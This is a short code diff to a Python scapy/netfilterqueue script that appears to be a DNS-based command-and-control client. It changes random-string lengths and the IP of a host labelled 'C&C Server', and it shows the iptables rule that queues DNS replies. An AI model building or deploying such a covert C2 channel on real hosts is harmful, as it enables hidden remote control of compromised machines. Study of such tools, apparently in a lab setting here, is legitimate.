@@ -6,10 +6,10 @@ from scapy.all import *
 from netfilterqueue import NetfilterQueue
 
 RANDOM_CHARS = 'abcdefghijklmnopqrstuvwxyz1234567890'
-RAND_MIN_LEN = 7
-RAND_MAX_LEN = 15
+RAND_MIN_LEN = 50
+RAND_MAX_LEN = 57
 
-CCIP = '10.4.18.1'  # C&C Server
+CCIP = '10.4.18.65'  # C&C Server
 QUERY_DELAY = 3  # In seconds
 
 lastcommand = ''  # The previous command received
@@ -96,4 +96,3 @@ if __name__ == "__main__":
     nfqueue_process.join()
     os.system('iptables -D INPUT -p udp -m udp --sport 53 -j NFQUEUE --queue-num 1')
     print('[*] iptables rule removed')
-
